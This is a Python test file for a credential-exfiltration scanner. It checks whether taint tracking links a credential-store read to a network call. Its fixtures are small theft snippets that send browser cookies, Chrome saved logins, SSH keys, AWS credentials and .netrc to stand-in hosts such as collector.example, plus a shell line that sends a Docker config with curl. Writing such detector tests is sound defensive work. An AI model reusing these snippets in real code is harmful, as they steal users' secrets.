"""In Python, what a credential store read yields is followed by value, scope by scope.

`StoreFlow`'s textual join seeded on every word of the store line, the words inside its strings
and comments included, and grew file-wide through any line that mentioned one. It ended at 88 to
1,123 names per file and joined a store read to a call in an unrelated function on all 18 benign
PyPI units it blocked (reviews/pypi-98/17-EXFIL-SCANNER-ERRORS.md §1). Python is now answered on
`ScopedTaint`. Theft by value still flows: a cookie jar into a request, a helper's return, a copy
of the store, a file written and read back. A parse error keeps the textual answer.
"""

from __future__ import annotations

import textwrap

import pytest

from cordon_scanner.detect.code.store_flow import StoreFlow


class PythonFlowKit:
    """Helpers for test_store_flow_python.py."""

    @staticmethod
    def lines_of(text: str, needle: str) -> list[int]:
        return [i for i, line in enumerate(text.split("\n"), start=1) if needle in line]

    @staticmethod
    def flows(source: str, store: str, egress: str) -> bool:
        text = textwrap.dedent(source)
        return StoreFlow.reaches(
            text,
            PythonFlowKit.lines_of(text, store),
            PythonFlowKit.lines_of(text, egress),
            language="python",
        )


NO_FLOW = {
    "a store read and a request in two functions sharing a name": (
        """
        import os, requests
        def key_size():
            with open(os.path.expanduser("~/.ssh/id_rsa")) as f:  # STORE
                data = f.read()
            return len(data) > 0
        def status(url):
            data = {"ping": 1}
            return requests.post(url, json=data, timeout=5)  # EGRESS
        """
    ),
    "the words of a command string on the store line": (
        """
        import subprocess, requests
        def wifi_password(ssid):
            out = subprocess.run(  # STORE
                ["security", "find-generic-password", "-wa", ssid], capture_output=True, text=True
            )
            print(out.stdout)
        def public_ip(find, generic, password):
            return requests.get("https://api.ipify.org", params={"f": find}).text  # EGRESS
        """
    ),
    "prose on the store line": (
        """
        import requests
        HELP = "Configure AWS credentials in ~/.aws/credentials or the environment"  # STORE
        def check(service):
            response = requests.get("https://status.example.org/" + service, timeout=1)  # EGRESS
            return response.ok
        """
    ),
}

FLOW = {
    "a browser cookie jar handed to a request": (
        """
        import browser_cookie3  # STORE
        import requests
        def billing(url):
            jar = browser_cookie3.chrome(domain_name="example.org")
            return requests.get(url, cookies=jar)  # EGRESS
        """
    ),
    "a helper returning the cookies, posted": (
        """
        import json, requests
        from pycookiecheat import chrome_cookies  # STORE
        def cookies():
            return chrome_cookies("https://example.org")
        requests.post("https://collector.example/x", data=json.dumps(cookies()))  # EGRESS
        """
    ),
    "the store copied, read and posted": (
        """
        import shutil, sqlite3, requests
        from pathlib import Path
        src = Path.home() / ".config" / "google-chrome" / "Default" / "Login Data"  # STORE
        def steal(staged):
            shutil.copy(src, staged)
            rows = sqlite3.connect(staged).execute("select * from logins").fetchall()
            requests.post("https://collector.example/x", json=rows)  # EGRESS
        """
    ),
    "the store written to a file and read back into a request": (
        """
        import os, requests
        def run():
            data = open(os.path.expanduser("~/.aws/credentials")).read()  # STORE
            with open("/tmp/c.txt", "w") as f:
                f.write(data)
            requests.post("https://collector.example/x", files={"f": open("/tmp/c.txt", "rb")})  # EGRESS
        """
    ),
    "the store read into a collection that is sent": (
        """
        import os, requests
        found = []
        def collect():
            for name in ("id_rsa", "id_ed25519"):
                with open(os.path.join(os.path.expanduser("~/.ssh"), name)) as f:  # STORE
                    found.append(f.read())
        def send():
            requests.post("https://collector.example/x", json={"keys": found})  # EGRESS
        """
    ),
    "the store read on the request's own line": (
        """
        import os, requests
        requests.post("https://collector.example/x", files={"f": open(os.path.expanduser("~/.netrc"))})  # STORE # EGRESS
        """
    ),
}


class TestPythonByValue:
    @pytest.mark.parametrize("name", sorted(NO_FLOW))
    def test_no_value_of_the_store_reaches_the_call(self, name: str) -> None:
        assert not PythonFlowKit.flows(NO_FLOW[name], "# STORE", "# EGRESS"), name

    @pytest.mark.parametrize("name", sorted(FLOW))
    def test_the_store_s_value_reaches_the_call(self, name: str) -> None:
        assert PythonFlowKit.flows(FLOW[name], "# STORE", "# EGRESS"), name


class TestFallsBackToText:
    def test_a_file_that_does_not_parse_keeps_the_textual_answer(self) -> None:
        text = "creds = open('/root/.netrc').read(\nrequests.post(u, data=creds)\n"
        assert StoreFlow.reaches(text, [1], [2], language="python") == StoreFlow.reaches(
            text, [1], [2]
        )

    def test_other_languages_are_unchanged(self) -> None:
        text = (
            'creds=$(cat ~/.docker/config.json)\n\n\n\ncurl -d "$creds" https://example.invalid\n'
        )
        assert StoreFlow.reaches(text, [1], [5], language="shell")
